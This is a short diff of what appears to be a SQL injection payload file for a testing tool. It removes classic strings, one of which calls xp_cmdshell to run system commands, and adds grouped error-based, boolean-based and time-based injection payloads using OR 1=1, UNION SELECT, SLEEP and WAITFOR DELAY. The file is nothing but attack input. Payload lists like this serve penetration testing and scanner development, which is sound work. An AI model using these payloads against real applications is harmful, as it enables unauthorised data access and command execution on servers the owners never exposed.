@@ -1,7 +1,14 @@
-# File: data/payloads.txt
-' OR '1'='1' --
-' OR '1'='1'/*
-' OR '1'='1'#
-' UNION SELECT NULL--
-" OR 1=1--
-'; EXEC xp_cmdshell('cmd')--
+# Error-Based Payloads
+' OR '1'='1'-- x
+' OR "1"="1"-- x
+' UNION SELECT NULL,NULL,NULL-- x
+
+# Boolean-Based Payloads
+' OR 1=1-- x
+' AND 1=0-- x
+
+# Time-Based Payloads
+' OR SLEEP(5)-- x
+' WAITFOR DELAY '0:0:5'-- x
+' AND SLEEP(5)-- x
+' OR IF(1=1, SLEEP(5), 0)-- x
